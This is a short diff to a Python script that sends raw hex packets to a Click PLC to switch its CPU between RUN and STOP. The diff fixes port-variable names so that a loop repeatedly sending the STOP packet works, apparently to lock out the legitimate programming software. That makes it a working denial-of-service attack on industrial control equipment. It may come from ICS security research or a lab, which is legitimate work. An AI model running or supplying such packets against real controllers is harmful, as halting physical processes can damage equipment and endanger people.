@@ -23,7 +23,7 @@ rec = None  # holds received data from the Click PLC
 srcIP = '192.168.0.20' # source IP address of sender
 srcPort = random.randint(40000, 55000) # source port
 dstIP = '192.168.0.101' # IP address of PLC
-dstport = 25425 # port number of PLC
+dstPort = 25425 # port number of PLC
 
 run = binascii.unhexlify("4b4f50002d00848405004d01651082") # packet to change CPU mode to RUN
 stop = binascii.unhexlify("4b4f50006300c6a405004d01651080") # packet to change CPU mode to STOP
@@ -41,7 +41,7 @@ rec = sock.sendto(stop, (dstIP, dstPort))
 # from the legitimate programming software
 try:
     while True:
-        sock.sendto(stop, (dstIP, port))
+        sock.sendto(stop, (dstIP, dstPort))
 except KeyboardInterrupt as e:
     sys.exit(0)
     
